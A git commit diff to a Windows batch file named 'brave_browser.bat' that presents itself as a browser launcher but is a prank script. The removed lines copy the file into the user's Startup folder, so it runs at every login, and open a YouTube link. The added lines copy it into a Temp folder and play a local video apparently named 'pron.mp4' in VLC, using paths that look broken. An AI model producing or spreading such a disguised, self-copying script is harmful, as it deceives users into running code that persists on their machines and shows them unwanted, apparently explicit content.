2b21344f22491341d1b541787b5f76097974fdd4
soulreaper71 <141745814+soulreaper71@users.noreply.github.com>
2026-05-27 22:59:52 +0530

    Update brave_browser.bat

--- brave_browser.bat
+++ brave_browser.bat
@@ -1,12 +1,12 @@
 @echo off
 for /f "delims=: tokens=*" %%A in ('findstr /b ::: "%~f0"') do @echo(%%A
 
-if exist "%userprofile%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/%~n0%~x0" (
-start "" https://youtu.be/xvFZjo5PgG0?si=7EvheP5qV0sNY2sa
+if exist "%userprofile%/AppData/Local/Temp%~n0%~x0" (
+vlc %userprofile%/AppData/Local/Temp/pron.mp4
 pause
 
 ) else (
-copy /y %~f0 "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\"
-start "" https://youtu.be/xvFZjo5PgG0?si=7EvheP5qV0sNY2sa
+copy /y %~f0 "%AppData%\Local\Temp"
+vlc %AppData%\Local\Temp\pron.mp4
 )
 cls
